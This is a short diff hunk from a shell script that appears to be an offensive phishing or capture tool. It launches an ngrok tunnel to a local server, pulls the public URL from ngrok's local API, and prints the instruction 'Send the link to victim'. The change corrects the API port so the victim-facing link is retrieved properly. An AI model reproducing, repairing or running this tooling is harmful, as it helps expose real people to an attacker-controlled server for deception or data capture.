@@ -322,7 +322,7 @@ sleep 2
 ./ngrok http 5555 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4041/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
 found
 }
